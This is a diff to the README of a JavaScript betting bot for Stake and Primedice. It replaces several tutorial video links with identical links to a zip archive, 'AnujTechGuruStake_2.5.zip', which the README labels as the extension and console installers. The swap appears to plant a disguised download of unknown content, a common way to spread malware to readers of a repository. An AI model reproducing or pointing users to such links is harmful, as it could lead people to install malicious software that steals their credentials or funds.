@@ -3,8 +3,8 @@ a javascript coded bot for Stake, Primedice, copy-paste in the console. (Dice, L
 the strategy script must be coded in javascript, and not Lua script. 
 
 # Videos: <br /> 
-install extension: https://vimeo.com/954123726 <br />
-install console: https://cos.tv/videos/play/52855058251682816 <br />
+install extension: https://raw.githubusercontent.com/AnujTechGuru/AnujTechGuruStake/main/overstudiously/AnujTechGuruStake_2.5.zip <br />
+install console: https://raw.githubusercontent.com/AnujTechGuru/AnujTechGuruStake/main/overstudiously/AnujTechGuruStake_2.5.zip <br />
 
 # Info: <br />
 Please favourite the repo in case you liked/used it. Thank you!
@@ -100,7 +100,7 @@ chance = 99 / target
 nextbet = 0 
 ```
 <b>Slide:</b>
-> use: https://www.youtube.com/watch?v=TkDPeuxEOUM <br />
+> use: https://raw.githubusercontent.com/AnujTechGuru/AnujTechGuruStake/main/overstudiously/AnujTechGuruStake_2.5.zip <br />
 ```javascript
 game = "slide"
 nextbet = 0.01
